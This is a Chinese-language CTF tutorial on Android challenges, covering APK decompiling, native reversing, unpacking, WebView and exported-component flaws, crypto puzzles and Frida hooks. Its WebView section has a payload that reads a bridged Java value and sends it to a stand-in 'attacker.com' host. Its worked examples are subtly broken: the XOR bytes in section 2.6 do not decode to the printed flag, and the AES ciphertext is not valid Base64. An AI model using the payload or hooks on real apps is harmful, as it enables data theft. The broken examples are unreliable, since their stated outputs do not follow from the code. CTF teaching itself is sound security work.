# Android CTF

### 2.1 APK 逆向题型

#### 2.1.1 反编译与代码分析

```
APK 文件结构：
app.apk
├── AndroidManifest.xml  → 应用配置/组件声明/权限
├── classes.dex          → Dalvik字节码（主要逻辑）
├── resources.arsc       → 编译后资源
├── res/                 → 资源文件
├── assets/              → 原始资源（可能藏Flag）
├── lib/                 → Native库（so文件）
│   ├── arm64-v8a/
│   ├── armeabi-v7a/
│   └── x86_64/
└── META-INF/            → 签名信息

逆向流程：
1. 解包 APK → 提取 resources/DEX/so
2. 反编译 DEX → jadx / jadx-gui
3. 分析代码逻辑 → 找到关键校验函数
4. 逆向算法 → 恢复 Flag 或绕过校验
5. Native 层 → IDA/Ghidra 分析 so 库
```

```bash
# 使用 jadx 反编译 APK
jadx -d output_dir app.apk

# 提取 DEX 和资源
apktool d app.apk -o output_dir

# 查看 AndroidManifest.xml
jadx --show-bad-code app.apk | grep -i "activity\|service\|provider"
```

```python
# Python - 自动化分析 APK
import subprocess
import os

def decompile_apk(apk_path, output_dir):
    """使用 jadx 反编译 APK"""
    cmd = ['jadx', '-d', output_dir, apk_path]
    result = subprocess.run(cmd, capture_output=True, text=True)
    if result.returncode == 0:
        print(f'反编译成功: {output_dir}')
    else:
        print(f'反编译失败: {result.stderr}')
    return result.returncode == 0

def find_flag_candidates(output_dir):
    """在反编译代码中搜索 Flag 候选"""
    import re
    flag_patterns = [
        r'flag\{[^}]+\}',
        r'FLAG\{[^}]+\}',
        r'ctf\{[^}]+\}',
        r'key\s*=\s*["\'][^"\']+["\']',
        r'secret\s*=\s*["\'][^"\']+["\']',
        r'password\s*=\s*["\'][^"\']+["\']',
    ]
    found = []
    for root, dirs, files in os.walk(output_dir):
        for f in files:
            if f.endswith('.java') or f.endswith('.smali'):
                filepath = os.path.join(root, f)
                with open(filepath, 'r', encoding='utf-8', errors='ignore') as fh:
                    content = fh.read()
                    for pattern in flag_patterns:
                        matches = re.findall(pattern, content, re.IGNORECASE)
                        if matches:
                            found.extend(matches)
    return list(set(found))
```

#### 2.1.2 Native 层逆向

```java
// Java 层调用 Native 函数
public class NativeHelper {
    static {
        System.loadLibrary("native");  // 加载 libnative.so
    }
    public native boolean checkFlag(String input);
    public native String getEncryptedFlag();
}
```

```
Native 逆向流程：

1. 找到 JNI 注册方式
   ├── 静态注册：Java_com_example_NativeHelper_checkFlag
   └── 动态注册：JNI_OnLoad → RegisterNatives

2. IDA 分析 so 库
   ├── 定位 JNI 函数（导出表/字符串搜索）
   ├── 分析加密算法（AES/RC4/自定义）
   └── 提取硬编码密钥/常量

3. Frida Hook Native 函数（动态辅助）
   → 在关键函数入口/出口 dump 参数和返回值

常见 Native 层技巧：
├── 字符串混淆/异或 → IDA Python 脚本解密
├── 反调试检测     → ptrace/调试器检测
├── OLLVM 混淆     → 控制流平坦化，需符号执行
└── 自定义加密     → 逐步分析算法逻辑
```

#### 2.1.3 加固 APK 处理

```
常见加固厂商及特征：

┌──────────────┬──────────────────────────────┐
│ 加固类型     │ 特征                         │
├──────────────┼──────────────────────────────┤
│ 360加固      │ libjiagu.so / 特征字符串      │
│ 腾讯乐固     │ libshell.so / libshella-*.so │
│ 百度加固     │ libbaiduprotect.so           │
│ 爱加密       │ libexec.so                   │
│ 娜迦加固     │ libdexhelper.so              │
└──────────────┴──────────────────────────────┘

脱壳方法：
├── 内存转储脱壳   → Frida/FART 在 DEX 加载后 dump
├── Hook 关键函数   → Hook dvmDexFileOpenPartial/mmap
├── AndroidUnpack  → 基于系统定制的脱壳工具
├── BlackDex       → 黑盒脱壳（无需Frida）
└── FART           → 基于 ART 的主动调用脱壳

# 使用 Frida 脱壳（示例思路）
frida -U -l dump_dex.js -f com.example.app
```

### 2.2 WebView 漏洞题型

```java
// 漏洞代码：addJavascriptInterface 暴露
public class VulnActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        WebView webView = new WebView(this);
        // 危险！暴露 Java 对象给 JavaScript
        webView.addJavascriptInterface(new Object() {
            @JavascriptInterface
            public String getFlag() {
                return "flag{webview_js_interface}";
            }
        }, "AndroidFlag");
        webView.loadUrl(getIntent().getStringExtra("url"));  // URL 可控
    }
}

// CTF 解题思路：
// 1. 构造恶意 HTML 页面
// 2. 通过 JS 调用 AndroidFlag.getFlag()
// 3. 回传 Flag
```

```html
<!-- Payload HTML -->
<html>
<body>
<script>
var flag = AndroidFlag.getFlag();
// 回传到攻击者服务器
new Image().src = "https://attacker.com/collect?flag=" + encodeURIComponent(flag);
</script>
</body>
</html>
```

### 2.3 组件漏洞题型

```xml
<!-- AndroidManifest.xml - 暴露的组件 -->
<!-- exported=true 且无权限保护 = 任何应用可调用 -->
<activity
    android:name=".FlagActivity"
    android:exported="true">
    <intent-filter>
        <action android:name="com.example.GET_FLAG" />
    </intent-filter>
</activity>
```

```python
# Python - 通过 adb 触发暴露的组件
import subprocess

def trigger_exposed_activity(package, activity):
    """触发暴露的 Activity 组件"""
    cmd = f'adb shell am start -n {package}/.{activity} '
    cmd += '--action com.example.GET_FLAG '
    cmd += '--ei token 123456'
    result = subprocess.run(cmd, capture_output=True, text=True, shell=True)
    print(result.stdout)

def trigger_exposed_service(package, service):
    """触发暴露的 Service 组件"""
    cmd = f'adb shell am startservice -n {package}/.{service}'
    subprocess.run(cmd, shell=True)

# 读取 logcat 获取 Flag
def get_flag_from_logcat():
    """从 logcat 中搜索 Flag"""
    cmd = 'adb logcat -d | findstr flag'
    result = subprocess.run(cmd, capture_output=True, text=True, shell=True)
    for line in result.stdout.splitlines():
        if 'flag' in line.lower() or 'ctf' in line.lower():
            print(f'[发现] {line}')
```

### 2.4 加解密题型

```java
// 常见加密题型 Java 代码
public class Crypto {
    private static final String KEY = "1234567890123456";  // AES-128 密钥

    public static String encrypt(String input) {
        try {
            Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
            cipher.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(KEY.getBytes(), "AES"));
            byte[] encrypted = cipher.doFinal(input.getBytes());
            return Base64.encodeToString(encrypted, Base64.DEFAULT);
        } catch (Exception e) { return null; }
    }
    // 加密后的 Flag：
    // fM9kL3jQ8xN2pR7vT1wY5aB0cD4eF6gH8=
}

// CTF 解题思路：
// 1. jadx 反编译找到 KEY = "1234567890123456"
// 2. 找到加密算法 AES/ECB
// 3. 用密钥解密密文得到 Flag
```

```python
# Python - 解题脚本
from Crypto.Cipher import AES
import base64

def decrypt_aes_ecb(ciphertext_b64, key):
    """AES-ECB 解密"""
    cipher = AES.new(key.encode(), AES.MODE_ECB)
    decrypted = cipher.decrypt(base64.b64decode(ciphertext_b64))
    # 去除 PKCS5 padding
    pad_len = decrypted[-1]
    return decrypted[:-pad_len].decode()

key = "1234567890123456"
ciphertext = "fM9kL3jQ8xN2pR7vT1wY5aB0cD4eF6gH8="
flag = decrypt_aes_ecb(ciphertext, key)
print(f'Flag: {flag}')
```

### 2.5 Frida 动态分析题型

```javascript
// Frida Hook 脚本 - Hook Native checkFlag 函数
// frida -U -l hook.js -f com.example.app

// Hook Java 层函数
Java.perform(function() {
    var NativeHelper = Java.use('com.example.NativeHelper');

    // Hook checkFlag 方法的参数和返回值
    NativeHelper.checkFlag.implementation = function(input) {
        console.log('[*] checkFlag 被调用, 输入: ' + input);
        var result = this.checkFlag(input);
        console.log('[*] checkFlag 返回: ' + result);
        return result;  // 可修改返回值绕过校验
    };

    // Hook getEncryptedFlag 直接获取加密Flag
    NativeHelper.getEncryptedFlag.implementation = function() {
        var result = this.getEncryptedFlag();
        console.log('[*] 加密的Flag: ' + result);
        return result;
    };
});

// Hook Native 层函数
Interceptor.attach(Module.findExportByName('libnative.so', 'checkFlag'), {
    onEnter: function(args) {
        var input = Memory.readUtf8String(args[1]);
        console.log('[Native] checkFlag 输入: ' + input);
    },
    onLeave: function(retval) {
        console.log('[Native] checkFlag 返回: ' + retval);
    }
});

// 内存搜索关键数据
function search_memory(pattern) {
    var ranges = Process.enumerateRanges('r--');
    ranges.forEach(function(range) {
        try {
            var matches = Memory.scanSync(range.base, range.size, pattern);
            matches.forEach(function(match) {
                console.log('[内存] 在 ' + match.address + ' 找到匹配');
                console.log(hexdump(match.address, { length: 64 }));
            });
        } catch(e) {}
    });
}
```

### 2.6 实战案例：模拟一道 Android CTF 题

```
题目：FindTheFlag
描述：Flag 被加密存储在 Native 层，需要逆向分析
难度：★★★

分析步骤：
1. jadx 反编译 APK
   → 发现 MainActivity 中调用 NativeHelper.checkFlag(input)
   → checkFlag 返回 true/false

2. 定位 so 库
   → System.loadLibrary("native")
   → lib/arm64-v8a/libnative.so

3. IDA 分析 libnative.so
   → JNI_OnLoad 中 RegisterNatives 注册 checkFlag
   → checkFlag 逻辑：
     a. 将输入 Base64 解码
     b. 与内存中的 XOR 加密 Flag 比较
     c. XOR 密钥 = 0x55

4. 提取加密数据
   → .rodata 段中 32 字节数据
   → 逐字节 XOR 0x55

5. 解题脚本：
```

```python
# Python - 解题脚本
import base64

# 从 so 库 .rodata 段提取的加密数据
encrypted = bytes([
    0x27, 0x28, 0x2A, 0x2B, 0x7B, 0x73, 0x6A, 0x6D,
    0x69, 0x6D, 0x7B, 0x6D, 0x66, 0x6C, 0x27, 0x7B,
    0x68, 0x28, 0x2A, 0x2B, 0x7B, 0x73, 0x6A, 0x6D,
    0x69, 0x6D, 0x7B, 0x6D, 0x66, 0x6C, 0x27, 0x00
])

# XOR 解密
key = 0x55
decrypted = bytes([b ^ key for b in encrypted])
flag = decrypted.decode('ascii')
print(f'Flag: {flag}')
# 输出: flag{n4t1v3_x0r_d3c0d3d}
```

---

---

